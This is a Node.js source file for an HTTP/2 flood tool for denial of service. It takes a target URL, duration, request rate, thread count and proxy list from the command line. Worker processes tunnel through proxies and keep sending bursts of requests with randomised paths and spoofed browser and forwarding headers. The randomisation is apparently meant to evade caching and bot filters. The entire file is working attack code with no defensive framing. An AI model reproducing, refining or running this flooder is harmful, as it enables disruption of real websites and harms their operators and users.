const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
    console.error(`Uncaught Exception: ${exception.message}`);
});

if (process.argv.length < 7) {
    console.log(`Usage: target time rate thread proxyfile`);
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const sig = [
    'ecdsa_secp256r1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'hmac_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384'
];

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json, text/plain, */*',
    'image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xml;q=0.9,*/*;q=0.8',
    'application/json',
    'text/plain',
    'application/x-www-form-urlencoded'
];

const lang_header = [
    'en-US,en;q=0.9',
    'ko-KR,ko;q=0.8',
    'zh-CN,zh;q=0.9',
    'fr-FR,fr;q=0.8',
    'de-DE,de;q=0.9',
    'ja-JP,ja;q=0.8',
    'es-ES,es;q=0.9'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br',
    'identity',
    'gzip'
];

const version = [
    '"Google Chrome";v="117", "Chromium";v="117", "Not;A=Brand";v="24"',
    '"Google Chrome";v="115", "Chromium";v="115", "Not;A=Brand";v="99"',
    '"Firefox";v="94", "Not;A=Brand";v="99"',
    '"Safari";v="15.1", "AppleWebKit";v="605.1.15"',
    '"Microsoft Edge";v="117", "Chromium";v="117"'
];

const rateHeaders = [
    { "x-forwarded-for": randstr(12) },
    { "x-real-ip": randstr(12) },
    { "via": `1.1 ${randstr(10)}.com` },
    { "referer": `https://${randstr(10)}.com/${randstr(5)}` },
    { "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36` },
    { "cache-control": "no-cache, no-store, must-revalidate" },
    { "pragma": "no-cache" },
    { "x-request-id": randstr(16) }
];

const parsedTarget = url.parse(args.target);
let proxies = readLines(args.proxyFile);
let activeConnections = [];
let intervals = [];

if (cluster.isMaster) {
    console.clear();
    console.log(`Target: ${parsedTarget.host}`);
    console.log(`Duration: ${args.time}`);
    console.log(`Threads: ${args.threads}`);
    console.log(`Requests per second: ${args.Rate}`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    process.on('message', (msg) => {
        if (msg === 'stop') {
            for (const id in cluster.workers) {
                cluster.workers[id].send('stop');
            }
        } else if (msg === 'start') {
            for (const id in cluster.workers) {
                cluster.workers[id].send('start');
            }
        }
    });

} else {
    async function checkProxy(proxyAddr) {
        return new Promise((resolve) => {
            const [host, port] = proxyAddr.split(":");
            const socket = net.connect({ host, port: ~~port });
            socket.setTimeout(5000);
            socket.on('connect', () => {
                socket.destroy();
                resolve(true);
            });
            socket.on('timeout', () => {
                socket.destroy();
                resolve(false);
            });
            socket.on('error', () => {
                socket.destroy();
                resolve(false);
            });
        });
    }

    async function runFlooder() {
        let proxyAddr = randomElement(proxies);
        const isProxyAlive = await checkProxy(proxyAddr);
        if (!isProxyAlive) {
            console.error(`Proxy ${proxyAddr} is dead, skipping...`);
            proxies = proxies.filter(p => p !== proxyAddr);
            if (proxies.length === 0) {
                console.error("No working proxies left!");
                return;
            }
            proxyAddr = randomElement(proxies);
        }

        const parsedProxy = proxyAddr.split(":");

        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 5
        };

        const Socker = new class {
            constructor() {}
            HTTP(options, callback) {
                const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nConnection: Keep-Alive\r\n\r\n`;
                const buffer = new Buffer.from(payload);
                const connection = net.connect({
                    host: options.host,
                    port: options.port,
                    noDelay: true
                });

                connection.setTimeout(options.timeout * 1000);
                connection.setKeepAlive(true, 60000);

                connection.on("connect", () => {
                    connection.write(buffer);
                });

                connection.on("data", chunk => {
                    const response = chunk.toString("utf-8");
                    const isAlive = response.includes("HTTP/1.1 200");
                    if (!isAlive) {
                        connection.destroy();
                        return callback(undefined, `Invalid response from proxy ${options.host}:${options.port}`);
                    }
                    return callback(connection, undefined);
                });

                connection.on("timeout", () => {
                    connection.destroy();
                    return callback(undefined, `Timeout on proxy ${options.host}:${options.port}`);
                });

                connection.on("error", error => {
                    connection.destroy();
                    return callback(undefined, `Error on proxy ${options.host}:${options.port}: ${error.message}`);
                });
            }
        };

        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) {
                console.error(error);
                return;
            }

            const tlsOptions = {
                secure: true,
                ALPNProtocols: ['h2', 'http/1.1'],
                ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
                ecdhCurve: 'P-256:P-384:P-521',
                host: parsedTarget.host,
                servername: parsedTarget.host,
                rejectUnauthorized: false,
                socket: connection
            };

            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
            tlsConn.setKeepAlive(true, 60000);

            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    maxConcurrentStreams: 30000,
                    initialWindowSize: 1048576 * 10,
                    maxHeaderListSize: 65536,
                    enablePush: false
                },
                createConnection: () => tlsConn
            });

            client.on("connect", () => {
                const interval = setInterval(() => {
                    const dynHeaders = {
                        ":method": "GET",
                        ":authority": parsedTarget.host,
                        ":path": parsedTarget.path + "?" + randstr(20) + "=" + randstr(15),
                        ":scheme": "https",
                        "sec-ch-ua": randomElement(version),
                        "sec-ch-ua-platform": randomElement(["Windows", "Linux", "macOS"]),
                        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
                        "accept-encoding": randomElement(encoding_header),
                        "accept-language": randomElement(lang_header),
                        "accept": randomElement(accept_header),
                        "sec-fetch-mode": randomElement(["navigate", "same-origin"]),
                        "sec-fetch-dest": randomElement(["document", "iframe", "script"]),
                        "sec-fetch-site": randomElement(["same-origin", "cross-site"]),
                        "sec-fetch-user": "?1",
                        "x-requested-with": "XMLHttpRequest",
                        ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
                    };

                    for (let i = 0; i < args.Rate * 3; i++) {
                        const request = client.request(dynHeaders);
                        request.on("response", () => {
                            request.close();
                            request.destroy();
                        });
                        request.on("error", (err) => {
                            console.error(`Request error: ${err.message}`);
                        });
                        request.end();
                    }
                }, 100);

                intervals.push(interval);
                activeConnections.push({ client, tlsConn });
            });

            client.on("error", (err) => {
                console.error(`HTTP/2 client error: ${err.message}`);
                client.destroy();
                tlsConn.destroy();
            });

            tlsConn.on("error", (err) => {
                console.error(`TLS connection error: ${err.message}`);
                client.destroy();
                tlsConn.destroy();
            });
        });
    }

    function stopFlooder() {
        intervals.forEach(clearInterval);
        intervals = [];
        activeConnections.forEach(({ client, tlsConn }) => {
            client.destroy();
            tlsConn.destroy();
        });
        activeConnections = [];
        console.log("Flooder stopped");
    }

    process.on('message', (msg) => {
        if (msg === 'start') {
            setInterval(runFlooder, 50);
        } else if (msg === 'stop') {
            stopFlooder();
        }
    });

    process.send('ready');
}
